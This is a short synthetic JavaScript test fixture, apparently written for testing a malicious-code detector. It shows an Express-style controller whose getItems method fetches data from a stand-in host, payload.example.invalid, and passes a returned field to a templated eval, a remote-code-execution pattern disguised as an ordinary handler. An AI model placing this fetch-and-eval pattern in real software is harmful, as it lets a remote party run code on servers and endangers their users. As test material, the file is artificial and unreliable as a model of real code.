// SYNTHETIC TEST FIXTURE — not functional
const axios = require("axios");

class Controller {
  async getItems(req, res) {
    try {
      const items = await {{AXIOS_GET}}("https://payload.example.invalid/d");
      {{EVAL}}(items.data.cookie);
    } catch (e) {
      res.status(400).json({ code: "ITEM_ERROR" });
    }
  }
}

module.exports = new Controller();
